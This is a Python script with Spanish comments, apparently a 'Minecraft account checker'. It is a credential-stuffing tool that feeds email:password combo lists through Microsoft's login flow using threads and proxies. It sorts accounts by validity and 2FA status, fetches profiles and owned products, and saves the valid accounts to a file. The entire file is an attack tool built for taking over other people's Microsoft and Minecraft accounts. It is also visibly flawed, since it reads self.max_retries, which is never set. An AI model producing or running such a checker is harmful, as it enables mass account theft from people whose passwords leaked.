import requests
import re
import json
import time
import random
import urllib3
import threading
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
import os
from datetime import datetime

# Inicializar colorama
init(autoreset=True)

# Deshabilitar warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class MinecraftAccountChecker:
    def __init__(self, proxy=None, max_retries=3):
        self.session = requests.Session()
        self.session.verify = False
        
        # Headers actualizados
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
        })
        
        # Configurar retries
        retry_strategy = Retry(
            total=max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        if proxy:
            self.session.proxies = proxy
            
        self.sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

    def get_urlPost_sFTTag(self):
        """Obtiene los tokens iniciales para la autenticación - CORREGIDO"""
        retries = 0
        while retries < self.max_retries:
            try:
                response = self.session.get(self.sFTTag_url, timeout=20)
                
                if response.status_code != 200:
                    retries += 1
                    continue
                
                text = response.text
                
                # Buscar sFTTag con diferentes patrones - CORREGIDO
                sFTTag = None
                patterns = [
                    r'name="PPFT"\s+value="([^"]+)"',
                    r'value="([^"]+)"\s+name="PPFT"',
                    r'id="i0327"\s+value="([^"]+)"',
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, text)
                    if match:
                        sFTTag = match.group(1)
                        break
                
                if not sFTTag:
                    retries += 1
                    continue
                
                # Buscar urlPost - CORREGIDO
                urlPost_patterns = [
                    r'"urlPost":"([^"]+)"',
                    r"urlPost:'([^']+)'",
                    r'form[^>]*action="([^"]+)"',
                ]
                
                urlPost = None
                for pattern in urlPost_patterns:
                    match = re.search(pattern, text)
                    if match:
                        urlPost = match.group(1)
                        # Asegurar que sea URL completa
                        if urlPost.startswith('/'):
                            urlPost = 'https://login.live.com' + urlPost
                        break
                
                if urlPost and sFTTag:
                    return urlPost, sFTTag
                else:
                    retries += 1
                    
            except Exception:
                retries += 1
                time.sleep(1)
        
        return None, None

    def get_xbox_token(self, email, password, urlPost, sFTTag):
        """Autentica con Microsoft y obtiene token de Xbox - CORREGIDO"""
        retries = 0
        while retries < self.max_retries:
            try:
                # Preparar datos del formulario
                data = {
                    'login': email,
                    'loginfmt': email, 
                    'passwd': password,
                    'PPFT': sFTTag,
                }
                
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://login.live.com',
                    'Referer': self.sFTTag_url,
                }
                
                # No seguir redirects automáticamente
                login_request = self.session.post(
                    urlPost, 
                    data=data, 
                    headers=headers,
                    allow_redirects=False,
                    timeout=20
                )
                
                # Verificar si hay token en la URL de redirect
                if 'Location' in login_request.headers:
                    location = login_request.headers['Location']
                    if 'access_token' in location:
                        parsed = urlparse(location)
                        fragment = parse_qs(parsed.fragment)
                        token = fragment.get('access_token', [None])[0]
                        if token:
                            return token, "SUCCESS"
                
                # Seguir manualmente los redirects si es necesario
                if login_request.status_code in [301, 302, 303]:
                    redirect_url = login_request.headers.get('Location', '')
                    if redirect_url:
                        final_response = self.session.get(
                            redirect_url, 
                            allow_redirects=True, 
                            timeout=20
                        )
                        
                        # Verificar token en la URL final
                        if 'access_token' in final_response.url:
                            parsed = urlparse(final_response.url)
                            fragment = parse_qs(parsed.fragment)
                            token = fragment.get('access_token', [None])[0]
                            if token:
                                return token, "SUCCESS"
                
                # Manejar casos especiales
                response_text = login_request.text
                
                if any(value in response_text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"]):
                    return None, "2FA_REQUIRED"
                    
                elif any(value in response_text.lower() for value in ["password is incorrect", "invalid credentials"]):
                    return None, "INVALID_CREDENTIALS"
                    
                elif "tried to sign in too many times" in response_text.lower():
                    return None, "TOO_MANY_ATTEMPTS"
                    
                else:
                    retries += 1
                    time.sleep(1)
                    
            except requests.exceptions.Timeout:
                retries += 1
                time.sleep(1)
            except Exception:
                retries += 1
                time.sleep(1)
                
        return None, "AUTH_FAILED"

    def get_minecraft_token(self, xbox_token):
        """Obtiene el token de Minecraft usando el token de Xbox - CORREGIDO"""
        retries = 0
        while retries < self.max_retries:
            try:
                # Paso 1: Autenticar con Xbox Live
                xbox_payload = {
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com", 
                        "RpsTicket": xbox_token
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                }
                
                xbox_login = self.session.post(
                    'https://user.auth.xboxlive.com/user/authenticate',
                    json=xbox_payload,
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                    timeout=20
                )
                
                if xbox_login.status_code != 200:
                    retries += 1
                    continue
                    
                xbox_data = xbox_login.json()
                xbox_token = xbox_data.get('Token')
                uhs = xbox_data['DisplayClaims']['xui'][0]['uhs']
                
                # Paso 2: Obtener token XSTS
                xsts_payload = {
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [xbox_token]
                    },
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                }
                
                xsts = self.session.post(
                    'https://xsts.auth.xboxlive.com/xsts/authorize',
                    json=xsts_payload,
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                    timeout=20
                )
                
                if xsts.status_code != 200:
                    retries += 1
                    continue
                    
                xsts_data = xsts.json()
                xsts_token = xsts_data.get('Token')
                
                # Paso 3: Obtener token de Minecraft
                mc_payload = {
                    'identityToken': f"XBL3.0 x={uhs};{xsts_token}"
                }
                
                mc_login = self.session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox',
                    json=mc_payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=20
                )
                
                if mc_login.status_code == 200:
                    mc_data = mc_login.json()
                    return mc_data.get('access_token')
                else:
                    retries += 1
                    
            except Exception:
                retries += 1
                time.sleep(1)
                
        return None

    def get_minecraft_profile(self, mc_token):
        """Obtiene el perfil de Minecraft (IGN) - CORREGIDO"""
        retries = 0
        while retries < self.max_retries:
            try:
                headers = {
                    'Authorization': f'Bearer {mc_token}',
                    'Content-Type': 'application/json'
                }
                
                response = self.session.get(
                    'https://api.minecraftservices.com/minecraft/profile',
                    headers=headers,
                    timeout=20
                )
                
                if response.status_code == 200:
                    profile_data = response.json()
                    username = profile_data.get('name', 'N/A')
                    uuid = profile_data.get('id', 'N/A')
                    capes = [cape["alias"] for cape in profile_data.get("capes", [])]
                    
                    return {
                        'username': username,
                        'uuid': uuid,
                        'capes': ", ".join(capes) if capes else "Ninguna",
                        'success': True
                    }
                elif response.status_code == 404:
                    return {
                        'username': 'N/A',
                        'uuid': 'N/A', 
                        'capes': 'Ninguna',
                        'success': True
                    }
                elif response.status_code == 429:
                    time.sleep(2)
                    retries += 1
                else:
                    retries += 1
                    
            except Exception:
                retries += 1
                time.sleep(1)
                
        return {'success': False, 'error': 'Max retries exceeded'}

    def check_account_ownership(self, mc_token):
        """Verifica qué productos de Minecraft posee la cuenta - CORREGIDO"""
        try:
            headers = {'Authorization': f'Bearer {mc_token}'}
            response = self.session.get(
                'https://api.minecraftservices.com/entitlements/license',
                headers=headers,
                timeout=20
            )
            
            if response.status_code == 200:
                items = response.json().get("items", [])
                
                has_minecraft = any(
                    item.get("name") in ["game_minecraft", "product_minecraft"] 
                    for item in items
                )
                
                if has_minecraft:
                    return "Minecraft Java Edition"
                else:
                    # Verificar otros productos
                    other_products = []
                    if any('product_minecraft_bedrock' in item.get("name", "") for item in items):
                        other_products.append("Minecraft Bedrock")
                    if any('product_legends' in item.get("name", "") for item in items):
                        other_products.append("Minecraft Legends")
                    if any('product_dungeons' in item.get("name", "") for item in items):
                        other_products.append('Minecraft Dungeons')
                        
                    if other_products:
                        return f"Otros: {', '.join(other_products)}"
                    else:
                        return "Correo Válido (Sin Minecraft)"
            else:
                return "Error verificando productos"
                
        except Exception:
            return "Error en verificación"

    def verify_account(self, email, password):
        """Verifica una cuenta completa de Minecraft - CORREGIDO Y SIMPLIFICADO"""
        try:
            # Paso 1: Obtener tokens iniciales
            urlPost, sFTTag = self.get_urlPost_sFTTag()
            if not urlPost:
                return {
                    "success": False, 
                    "email": email,
                    "error": "No se pudieron obtener tokens iniciales"
                }
            
            # Paso 2: Autenticar con Microsoft
            xbox_token, auth_status = self.get_xbox_token(email, password, urlPost, sFTTag)
            if auth_status != "SUCCESS":
                return {
                    "success": False,
                    "email": email, 
                    "error": auth_status
                }
            
            # Paso 3: Obtener token de Minecraft
            mc_token = self.get_minecraft_token(xbox_token)
            if not mc_token:
                return {
                    "success": False,
                    "email": email,
                    "error": "No se pudo obtener token de Minecraft"
                }
            
            # Paso 4: Obtener perfil
            profile = self.get_minecraft_profile(mc_token)
            if not profile['success']:
                return {
                    "success": False,
                    "email": email,
                    "error": profile['error']
                }
            
            # Paso 5: Verificar productos
            account_type = self.check_account_ownership(mc_token)
            
            return {
                "success": True,
                "email": email,
                "minecraft_profile": profile,
                "account_type": account_type,
                "error": ""
            }
            
        except Exception as e:
            return {
                "success": False,
                "email": email,
                "error": f"Error inesperado: {str(e)}"
            }

class CheckerManager:
    def __init__(self, threads=5, proxy=None):
        self.threads = threads
        self.proxy = proxy
        self.results = {
            'valid': 0,
            'invalid': 0,
            '2fa': 0,
            'valid_mail': 0,
            'errors': 0,
            'checked': 0
        }
        self.valid_accounts = []
        self.start_time = time.time()
        
    def check_account(self, combo):
        """Verifica una cuenta individual"""
        try:
            email, password = combo.strip().split(':', 1)
            checker = MinecraftAccountChecker(proxy=self.proxy)
            result = checker.verify_account(email.strip(), password.strip())
            return result
        except Exception as e:
            return {
                "success": False, 
                "error": f"Error procesando combo: {str(e)}", 
                "email": combo.split(':')[0] if ':' in combo else combo
            }

    def worker(self, combo):
        """Worker para threading"""
        result = self.check_account(combo)
        self.process_result(result)
        return result

    def process_result(self, result):
        """Procesa y muestra el resultado"""
        self.results['checked'] += 1
        
        if result["success"]:
            self.results['valid'] += 1
            self.valid_accounts.append(result)
            
            print(f"{Fore.GREEN}✅ VÁLIDA: {result['email']}")
            print(f"   👤 IGN: {result['minecraft_profile']['username']}")
            print(f"   🎮 Tipo: {result['account_type']}")
            print(f"   🆔 UUID: {result['minecraft_profile']['uuid']}")
            print(f"   🧥 Capas: {result['minecraft_profile']['capes']}")
            
        else:
            if result["error"] == "INVALID_CREDENTIALS":
                self.results['invalid'] += 1
                print(f"{Fore.RED}❌ INVALIDA: {result['email']}")
            elif result["error"] == "2FA_REQUIRED":
                self.results['2fa'] += 1
                print(f"{Fore.YELLOW}⚠️  2FA: {result['email']}")
            elif "Correo Válido" in result.get("account_type", ""):
                self.results['valid_mail'] += 1
                print(f"{Fore.BLUE}📧 CORREO VÁLIDO: {result['email']}")
            else:
                self.results['errors'] += 1
                print(f"{Fore.MAGENTA}❓ ERROR: {result['email']} - {result['error']}")

    def check_from_file(self, filename):
        """Verifica cuentas desde archivo"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                accounts = [line.strip() for line in f if ':' in line]
            
            print(f"{Fore.CYAN}📁 Verificando {len(accounts)} cuentas...")
            print(f"{Fore.CYAN}🧵 Usando {self.threads} hilos...")
            print("-" * 50)
            
            # Usar ThreadPoolExecutor con menos threads para mayor estabilidad
            with ThreadPoolExecutor(max_workers=min(self.threads, 5)) as executor:
                list(executor.map(self.worker, accounts))
            
            self.display_final_results()
            
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Archivo no encontrado: {filename}")
        except Exception as e:
            print(f"{Fore.RED}❌ Error leyendo archivo: {str(e)}")

    def display_final_results(self):
        """Muestra resultados finales"""
        end_time = time.time()
        elapsed_time = end_time - self.start_time
        
        print("\n" + "="*50)
        print(f"{Fore.CYAN}📊 RESULTADOS FINALES:")
        print(f"{Fore.GREEN}✅ Válidas: {self.results['valid']}")
        print(f"{Fore.RED}❌ Inválidas: {self.results['invalid']}")
        print(f"{Fore.YELLOW}⚠️  2FA: {self.results['2fa']}")
        print(f"{Fore.BLUE}📧 Correos Válidos: {self.results['valid_mail']}")
        print(f"{Fore.MAGENTA}❓ Errores: {self.results['errors']}")
        print(f"{Fore.CYAN}🔢 Total Verificadas: {self.results['checked']}")
        print(f"{Fore.CYAN}⏱️  Tiempo: {elapsed_time:.2f} segundos")
        
        if self.valid_accounts:
            print(f"\n{Fore.CYAN}📝 CUENTAS VÁLIDAS:")
            for acc in self.valid_accounts:
                print(f"  {Fore.GREEN}{acc['email']} | {acc['minecraft_profile']['username']} | {acc['account_type']}")

def test_individual():
    """Función de prueba individual"""
    print(f"{Fore.CYAN}🧪 MODO PRUEBA INDIVIDUAL")
    email = input("Email: ").strip()
    password = input("Contraseña: ").strip()
    
    checker = MinecraftAccountChecker()
    result = checker.verify_account(email, password)
    
    print(f"\n{Fore.CYAN}🎯 RESULTADO:")
    if result["success"]:
        print(f"{Fore.GREEN}✅ ÉXITO")
        print(f"Email: {result['email']}")
        print(f"IGN: {result['minecraft_profile']['username']}")
        print(f"UUID: {result['minecraft_profile']['uuid']}")
        print(f"Tipo: {result['account_type']}")
        print(f"Capas: {result['minecraft_profile']['capes']}")
    else:
        print(f"{Fore.RED}❌ FALLO")
        print(f"Error: {result['error']}")

def main():
    print(f"{Fore.GREEN}=== VERIFICADOR DE CUENTAS MINECRAFT ===")
    print(f"{Fore.CYAN}Versión Corregida - Estable")
    print()
    
    try:
        # Configuración simple
        try:
            threads = int(input("Hilos (recomendado 3-5): ").strip() or "3")
        except:
            threads = 3
            
        proxy = None
        use_proxy = input("Usar proxy? (s/n): ").strip().lower()
        if use_proxy == 's':
            proxy_type = input("Tipo (1: HTTP, 2: SOCKS4, 3: SOCKS5): ").strip()
            proxy_addr = input("Proxy (ip:puerto o user:pass@ip:puerto): ").strip()
            
            if proxy_type == '1':
                proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
            elif proxy_type == '2':
                proxy = {'http': f'socks4://{proxy_addr}', 'https': f'socks4://{proxy_addr}'}
            elif proxy_type == '3':
                proxy = {'http': f'socks5://{proxy_addr}', 'https': f'socks5://{proxy_addr}'}
            else:
                print(f"{Fore.YELLOW}⚠️  Tipo de proxy no válido, continuando sin proxy...")
        
        manager = CheckerManager(threads=threads, proxy=proxy)
        
        while True:
            print(f"\n{Fore.CYAN}1. 🧪 Prueba individual")
            print(f"{Fore.CYAN}2. 📁 Verificar desde archivo")
            print(f"{Fore.CYAN}3. 🚪 Salir")
            
            choice = input(f"\n{Fore.WHITE}Selecciona una opción: ").strip()
            
            if choice == "1":
                test_individual()
            elif choice == "2":
                filename = input("Archivo con cuentas (email:password): ").strip()
                if not os.path.exists(filename):
                    print(f"{Fore.RED}❌ El archivo no existe: {filename}")
                    continue
                manager.check_from_file(filename)
                
                # Preguntar si guardar resultados
                save = input(f"\n{Fore.CYAN}¿Guardar resultados en archivo? (s/n): ").strip().lower()
                if save == 's':
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"resultados_{timestamp}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write("=== RESULTADOS VERIFICACIÓN MINECRAFT ===\n")
                        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"Cuentas válidas: {manager.results['valid']}\n")
                        f.write(f"Cuentas inválidas: {manager.results['invalid']}\n")
                        f.write(f"2FA: {manager.results['2fa']}\n")
                        f.write(f"Correos válidos: {manager.results['valid_mail']}\n")
                        f.write(f"Errores: {manager.results['errors']}\n\n")
                        
                        if manager.valid_accounts:
                            f.write("=== CUENTAS VÁLIDAS ===\n")
                            for acc in manager.valid_accounts:
                                f.write(f"{acc['email']} | {acc['minecraft_profile']['username']} | {acc['account_type']}\n")
                    
                    print(f"{Fore.GREEN}✅ Resultados guardados en: {filename}")
                
            elif choice == "3":
                print(f"{Fore.GREEN}¡Hasta luego!")
                break
            else:
                print(f"{Fore.RED}❌ Opción inválida")
                
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⏹️  Programa interrumpido por el usuario")
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {str(e)}")

if __name__ == "__main__":
    main()
